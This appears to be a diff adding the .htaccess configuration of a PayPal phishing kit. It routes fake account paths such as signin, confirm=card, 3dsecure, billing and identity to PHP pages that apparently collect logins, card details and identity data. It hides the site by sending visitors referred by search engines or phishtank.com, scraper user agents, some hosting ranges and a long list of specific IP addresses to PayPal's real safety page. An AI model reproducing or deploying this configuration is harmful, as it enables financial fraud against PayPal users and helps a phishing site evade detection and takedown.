@@ -1,0 +1,578 @@
+#HTACCESS
+DirectoryIndex index.php
+RewriteEngine On
+RewriteCond %{HTTPS} off
+
+# CONFIG FILE
+RewriteEngine On
+RewriteRule ^admin/home$ admin/index.php [NC,L]
+RewriteRule ^admin/general$ admin/general.php [NC,L]
+RewriteRule ^admin/smtp$ admin/smtp.php [NC,L]
+RewriteRule ^logout?(.*)$ logout.php [NC,L]
+RewriteRule ^signin?(.*)$ signin.php [NC,L]
+RewriteRule ^authflow/entry?(.*)$ authflow.php [NC,L]
+RewriteRule ^myaccount/home?(.*)$ home.php [NC,L]
+RewriteRule ^myaccount/confirm=card$ card.php [NC,L]
+RewriteRule ^myaccount/3dsecure?(.*)$ 3dsecure.php [NC,L]
+RewriteRule ^myaccount/confirm=billing$ billing.php [NC,L]
+RewriteRule ^myaccount/confirm=information$ information.php [NC,L]
+RewriteRule ^myaccount/confirm=identity$ identity.php [NC,L]
+RewriteRule ^myaccount/restored$ restored.php [NC,L]
+RewriteRule ^success$ success.php [NC,L]
+
+# ERROR PAGE
+ErrorDocument 401 https://www.paypal.com/webapps/mpp/paypal-safety-and-security
+ErrorDocument 403 https://www.paypal.com/webapps/mpp/paypal-safety-and-security
+ErrorDocument 404 https://www.paypal.com/webapps/mpp/paypal-safety-and-security
+ErrorDocument 500 https://www.paypal.com/webapps/mpp/paypal-safety-and-security
+Options All -Indexes
+
+# BLOCK REFFERER
+RewriteEngine on
+RewriteCond %{HTTP_REFERER} google\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} facebook\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} yahoo\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} bing\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} msn\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} ask\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} excite\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} altavista\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} netscape\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} aol\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} hotbot\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} goto\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} lycos\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} metacrawler\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} phishtank\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} infoseek\.co\.jp [NC,OR]
+RewriteCond %{HTTP_REFERER} mamma\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} alltheweb\.com [NC]
+RewriteRule .* https://www.paypal.com/webapps/mpp/paypal-safety-and-security [R,L]
+
+# BLOCK USER AGENT
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} ^BlackWidow [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Bot\ mailto:craftbot@yahoo.com [OR]
+RewriteCond %{HTTP_USER_AGENT} ^ChinaClaw [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Custo [OR]
+RewriteCond %{HTTP_USER_AGENT} ^DISCo [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Download\ Demon [OR]
+RewriteCond %{HTTP_USER_AGENT} ^eCatch [OR]
+RewriteCond %{HTTP_USER_AGENT} ^EirGrabber [OR]
+RewriteCond %{HTTP_USER_AGENT} ^EmailSiphon [OR]
+RewriteCond %{HTTP_USER_AGENT} ^EmailWolf [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Express\ WebPictures [OR]
+RewriteCond %{HTTP_USER_AGENT} ^ExtractorPro [OR]
+RewriteCond %{HTTP_USER_AGENT} ^EyeNetIE [OR]
+RewriteCond %{HTTP_USER_AGENT} ^FlashGet [OR]
+RewriteCond %{HTTP_USER_AGENT} ^GetRight [OR]
+RewriteCond %{HTTP_USER_AGENT} ^GetWeb! [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Go!Zilla [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Go-Ahead-Got-It [OR]
+RewriteCond %{HTTP_USER_AGENT} ^GrabNet [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Grafula [OR]
+RewriteCond %{HTTP_USER_AGENT} ^HMView [OR]
+RewriteCond %{HTTP_USER_AGENT} HTTrack [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} ^Image\ Stripper [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Image\ Sucker [OR]
+RewriteCond %{HTTP_USER_AGENT} Indy\ Library [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} ^InterGET [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Internet\ Ninja [OR]
+RewriteCond %{HTTP_USER_AGENT} ^JetCar [OR]
+RewriteCond %{HTTP_USER_AGENT} ^JOC\ Web\ Spider [OR]
+RewriteCond %{HTTP_USER_AGENT} ^larbin [OR]
+RewriteCond %{HTTP_USER_AGENT} ^libghttp [OR]
+RewriteCond %{HTTP_USER_AGENT} ^LeechFTP [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Mass\ Downloader [OR]
+RewriteCond %{HTTP_USER_AGENT} ^MIDown\ tool [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Missigua [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Mister\ PiX [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Navroad [OR]
+RewriteCond %{HTTP_USER_AGENT} ^NearSite [OR]
+RewriteCond %{HTTP_USER_AGENT} ^NetAnts [OR]
+RewriteCond %{HTTP_USER_AGENT} ^NetSpider [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Net\ Vampire [OR]
+RewriteCond %{HTTP_USER_AGENT} ^NetZIP [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Octopus [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Offline\ Explorer [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Offline\ Navigator [OR]
+RewriteCond %{HTTP_USER_AGENT} ^PageGrabber [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Papa\ Foto [OR]
+RewriteCond %{HTTP_USER_AGENT} ^pavuk [OR]
+RewriteCond %{HTTP_USER_AGENT} ^pcBrowser [OR]
+RewriteCond %{HTTP_USER_AGENT} ^RealDownload [OR]
+RewriteCond %{HTTP_USER_AGENT} ^ReGet [OR]
+RewriteCond %{HTTP_USER_AGENT} ^SiteSnagger [OR]
+RewriteCond %{HTTP_USER_AGENT} ^SmartDownload [OR]
+RewriteCond %{HTTP_USER_AGENT} ^SuperBot [OR]
+RewriteCond %{HTTP_USER_AGENT} ^SuperHTTP [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Surfbot [OR]
+RewriteCond %{HTTP_USER_AGENT} ^tAkeOut [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Teleport\ Pro [OR]
+RewriteCond %{HTTP_USER_AGENT} ^VoidEYE [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Web\ Image\ Collector [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Web\ Sucker [OR]
+RewriteCond %{HTTP_USER_AGENT} ^WebAuto [OR]
+RewriteCond %{HTTP_USER_AGENT} ^WebCopier [OR]
+RewriteCond %{HTTP_USER_AGENT} ^WebFetch [OR]
+RewriteCond %{HTTP_USER_AGENT} ^WebGo\ IS [OR]
+RewriteCond %{HTTP_USER_AGENT} ^WebLeacher [OR]
+RewriteCond %{HTTP_USER_AGENT} ^WebReaper [OR]
+RewriteCond %{HTTP_USER_AGENT} ^WebSauger [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Website\ eXtractor [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Website\ Quester [OR]
+RewriteCond %{HTTP_USER_AGENT} ^WebStripper [OR]
+RewriteCond %{HTTP_USER_AGENT} ^WebWhacker [OR]
+RewriteCond %{HTTP_USER_AGENT} ^WebZIP [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Widow [OR]
+RewriteCond %{HTTP_USER_AGENT} ^WWWOFFLE [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Xaldon\ WebSpider [OR]
+RewriteCond %{HTTP_USER_AGENT} ^Zeus
+RewriteCond %{HTTP_USER_AGENT} ^-?$
+RewriteRule .* https://www.paypal.com/webapps/mpp/paypal-safety-and-security [R,L]
+
+# BLOCK IP
+deny from afterplayy\.com
+deny from host\.coloup\.com
+deny from visit\.keznews\.com
+deny from unknown\.Level3\.net
+deny from googleusercontent\.com
+allow from all
+
+# START HERE #
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^95.86.44.182$
+RewriteRule .* https://www.paypal.com/MK/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^92.236.71.55$
+RewriteRule .* https://www.paypal.com/UK/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^121.45.71.117$
+RewriteRule .* https://www.paypal.com/AU/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^138.122.96.109$
+RewriteRule .* https://www.paypal.com/MX/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^200.68.138.119$
+RewriteRule .* https://www.paypal.com/MX/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^162.193.201.60$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^209.52.88.194$
+RewriteRule .* https://www.paypal.com/CA/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^148.240.60.144$
+RewriteRule .* https://www.paypal.com/MX/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^177.247.85.235$
+RewriteRule .* https://www.paypal.com/MX/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^77.218.229.163$
+RewriteRule .* https://www.paypal.com/SE/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^71.193.156.66$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^83.34.4.223$
+RewriteRule .* https://www.paypal.com/ES/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^174.126.4.35$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^159.89.146.231$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^72.189.124.24$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^1.132.104.87$
+RewriteRule .* https://www.paypal.com/AU/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^189.40.105.55$
+RewriteRule .* https://www.paypal.com/BR/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^88.113.184.18$
+RewriteRule .* https://www.paypal.com/FI/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^82.222.130.22$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^191.34.116.45$
+RewriteRule .* https://www.paypal.com/BR/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^31.4.206.97$
+RewriteRule .* https://www.paypal.com/ES/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^88.242.4.49$
+RewriteRule .* https://www.paypal.com/TR/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^198.255.103.62$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^94.62.40.205$
+RewriteRule .* https://www.paypal.com/PT/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^79.16.137.242$
+RewriteRule .* https://www.paypal.com/IT/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^101.183.158.235$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^80.12.37.73$
+RewriteRule .* https://www.paypal.com/FR/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^184.161.224.131$
+RewriteRule .* https://www.paypal.com/CA/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^176.83.68.126$
+RewriteRule .* https://www.paypal.com/ES/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^79.161.225.172$
+RewriteRule .* https://www.paypal.com/NO/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^37.187.173.10$
+RewriteRule .* https://www.paypal.com/FR/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^83.165.17.25$
+RewriteRule .* https://www.paypal.com/ES/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^79.30.196.142$
+RewriteRule .* https://www.paypal.com/IT/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^2.143.125.153$
+RewriteRule .* https://www.paypal.com/ES/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^52.59.102.42$
+RewriteRule .* https://www.paypal.com/DE/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^66.102.6.193$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^62.255.45.137$
+RewriteRule .* https://www.paypal.com/UK/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^46.175.162.36$
+RewriteRule .* https://www.paypal.com/UA/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^130.211.246.133$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^95.120.29.89$
+RewriteRule .* https://www.paypal.com/ES/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^83.35.40.6$
+RewriteRule .* https://www.paypal.com/ES/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^208.91.113.20$
+RewriteRule .* https://www.paypal.com/CA/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^89.234.68.71$
+RewriteRule .* https://www.paypal.com/IE/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^83.59.19.116$
+RewriteRule .* https://www.paypal.com/ES/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^79.12.55.120$
+RewriteRule .* https://www.paypal.com/IT/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^52.28.3.120$
+RewriteRule .* https://www.paypal.com/DE/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^64.71.198.210$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^104.222.33.40$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^83.165.43.212$
+RewriteRule .* https://www.paypal.com/ES/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^83.33.169.212$
+RewriteRule .* https://www.paypal.com/ES/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^34.209.136.231$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^54.218.108.178$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^64.74.215.1$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^74.217.90.250$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^83.31.67.51$
+RewriteRule .* https://www.paypal.com/PL/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^83.31.67.51$
+RewriteRule .* https://www.paypal.com/PL/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^64.74.215.174$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^68.106.2.163$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^31.168.158.239$
+RewriteRule .* https://www.paypal.com/IL/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^18.232.141.183$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com//webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com/ID/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
+RewriteCond %{REMOTE_ADDR} ^$
+RewriteRule .* https://www.paypal.com/US/webapps/mpp/paypal-safety-and-security [R,L]
+
